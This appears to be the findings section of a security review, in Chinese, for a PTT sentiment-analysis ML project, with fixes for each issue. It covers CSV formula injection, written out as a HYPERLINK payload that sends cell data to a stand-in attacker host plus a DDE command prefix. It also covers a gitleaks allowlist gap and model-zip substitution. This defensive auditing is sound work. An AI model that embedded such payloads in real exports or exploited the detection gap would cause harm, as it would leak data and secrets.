## 發現

### L-1（low）不一致文章 CSV 沒有防公式注入

- 位置：`src/radar/ml/training/compare.py:287-308`（`write_disagreements` 原樣寫入 `title`）。同樣的寫法早已存在於 `src/radar/ml/labeling/cross_check.py:95-110`（階段 3），不是本版新增
- 攻擊情境：任何 PTT 使用者都能在被追蹤的看板發文，標題用 `=HYPERLINK("http://attacker/?d="&C3,"看原文")` 或 `=cmd|…` 開頭，內容寫得模稜兩可，讓兩版模型判斷不同，這篇就會進 `data/review/disagreements-<a>-vs-<b>.csv`。甲方依 7.27 用 Excel 或 Google Sheets 開這份 CSV 做錯誤分析時，公式會被執行
- 能拿到什麼：點了連結會把同一張表的儲存格內容帶到攻擊者的網址（內容是公開的標題與模型判斷，敏感度低）；舊版 Excel 的 DDE 會跳警告，使用者接受後可以執行命令。需要使用者配合操作，所以評 low
- 修法：寫 CSV 前，若字串欄位以 `=`、`+`、`-`、`@`、Tab、CR 開頭，就在前面加 `'`；兩處共用同一個函式，並補一個單元測試

### L-2（low）gitleaks revision 放行規則用子字串比對變數名，範圍比 D-026 想要的寬

- 位置：`.gitleaks.toml:16`
- 實測：用同一條 regex（Python `re`，語法與 RE2 相容），值都是 40 位小寫 hex：

| 字串 | 被放行 |
|---|---|
| `REVISION = "<hex>"` | 是（預期） |
| `SHARED_SECRET = "<hex>"` | 是 |
| `WEBHOOK_SHARED_KEY=<hex>` | 是 |
| `PREV_API_TOKEN: "<hex>"` | 是 |
| `ABBREV_KEY="<hex>"` | 是 |
| `api_key = "<hex>"` | 否 |

- 攻擊情境：這條不能直接被利用，而是讓偵測出現缺口。開發者或 agent 誤把一個 40 位 hex 的真密鑰提交進 git，例如 HMAC shared secret、舊式 GitHub OAuth token、各家 webhook secret；只要變數名裡出現 `sha`（如 `SHARED_…`）或 `rev`（如 `PREV_…`），CI 的 gitleaks 就不會擋，密鑰會進入 git 歷史與公開的 repo
- 修法：D-026 的文字是「變數名含 rev／revision／commit／sha」，現行實作符合字面，但不符合「範圍窄」的理由。建議只放行「以這些字結尾」的識別字，例如 `(?i:[a-z0-9_]*?(?:^|_|\b)(?:rev|revision|commit|sha))\s*[:=]+…`，並補 `SHARED_SECRET`、`PREV_TOKEN` 不被放行的測試案例。要不要收窄由 manager 判斷，是否需要回頭問甲方

### L-3（low）模型包的 SHA-256 只防損毀、不防替換；import_model 沒有比對整包雜湊

- 狀態：部分緩解。README 階段 8 第 3 步已寫明匯入前要先 `shasum -a 256` 對照 notebook 印出的值（`de9468a` 之後）；程式仍沒有強制
- 位置：`src/radar/ml/training/import_model.py:69-89`；notebook 最後一格只印出 zip 的 SHA-256
- 威脅表的對策是「`import_model` 比對 `model_card.files` 的 SHA-256，甲方對照 notebook 最後一格印出的值」。但 `model_card.json` 與兩個被雜湊的檔放在同一個 zip 裡，能換掉 zip 的人也能重算 `files`，所以內部比對只能擋損毀。真正擋替換的是「甲方對照 notebook 印出的 zip 雜湊」這一步，目前只靠甲方照 README 手動執行
- 攻擊情境：攻擊者要先能改甲方下載資料夾裡的檔案，或在下載途中動手腳，門檻很高。得手後放進自己做的 ONNX 模型，載入時不會執行程式（只接受 ONNX／JSON，CPU EP，沒有 custom op）。後果是 shadow 或切換後的情緒判斷被操縱，或用超大計算圖讓推論服務吃滿資源（shadow 有 `cpus: 2`、`mem_limit: 1.5g` 限制）
- 修法：`import_model` 加上 `--sha256 <notebook 印出的值>` 必填參數，先比對整個 zip 再解壓
